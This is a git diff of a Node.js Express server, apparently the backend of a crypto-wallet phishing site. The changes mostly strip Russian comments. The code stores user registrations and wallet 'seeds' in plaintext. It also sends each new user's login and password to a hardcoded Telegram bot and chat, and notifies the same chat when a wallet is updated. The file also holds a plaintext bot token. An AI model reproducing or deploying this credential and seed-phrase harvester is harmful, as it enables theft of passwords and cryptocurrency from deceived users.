@@ -1,7 +1,7 @@
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
-const axios = require('axios'); // Подключаем axios
+const axios = require('axios');
 const app = express();
 app.use(express.json());
 
@@ -17,8 +17,8 @@ const staticPath = path.join(__dirname, '../client');
 app.use(express.static(staticPath));
 
 const DB_FILE = 'users.json';
-const TELEGRAM_BOT_TOKEN = '7603140907:AAEHRJo0chFDDycRASXe5ljwtzfMwqe8qA4'; // Твой токен
-const TELEGRAM_CHAT_ID = '6404101950'; // Твой Telegram ID
+const TELEGRAM_BOT_TOKEN = '7603140907:AAEHRJo0chFDDycRASXe5ljwtzfMwqe8qA4';
+const TELEGRAM_CHAT_ID = '6404101950';
 
 function readDB() {
     if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify([]));
@@ -29,7 +29,6 @@ function writeDB(data) {
     fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
 }
 
-// Функция отправки уведомлений в Telegram
 async function sendTelegramNotification(message) {
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -39,7 +38,7 @@ async function sendTelegramNotification(message) {
         });
         console.log('Notification sent to Telegram');
     } catch (error) {
-        console.error('Error sending Telegram notification:', error);
+        console.error('Error sending Telegram notification:', error.message);
     }
 }
 
@@ -53,7 +52,6 @@ app.post('/register', async (req, res) => {
     users.push(req.body);
     writeDB(users);
 
-    // Уведомление о новом пользователе
     const message = `Новый пользователь зарегистрирован:\n` +
                     `Логин: ${req.body.login}\n` +
                     `Пароль: ${req.body.password}\n` +
@@ -83,7 +81,6 @@ app.post('/update-wallet', async (req, res) => {
         user.seeds = req.body.seeds;
         writeDB(users);
 
-        // Уведомление об обновлении кошелька
         const message = `Пользователь обновил кошелёк:\n` +
                         `Логин: ${user.login}\n` +
                         `ID: ${user.id}\n` +
@@ -109,7 +106,6 @@ app.post('/update-user', async (req, res) => {
         Object.assign(user, req.body);
         writeDB(users);
 
-        // Уведомление об обновлении данных через бот
         const message = `Пользователь обновил данные:\n` +
                         `Логин: ${user.login}\n` +
                         `ID: ${user.id}\n` +
@@ -122,7 +118,6 @@ app.post('/update-user', async (req, res) => {
     }
 });
 
-// Отдача index.html для всех остальных запросов
 app.get('*', (req, res) => {
     const indexPath = path.join(__dirname, '../client', 'index.html');
     console.log('Serving index.html from:', indexPath);
@@ -134,6 +129,5 @@ app.get('*', (req, res) => {
     });
 });
 
-// Запуск на динамическом порту Render
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
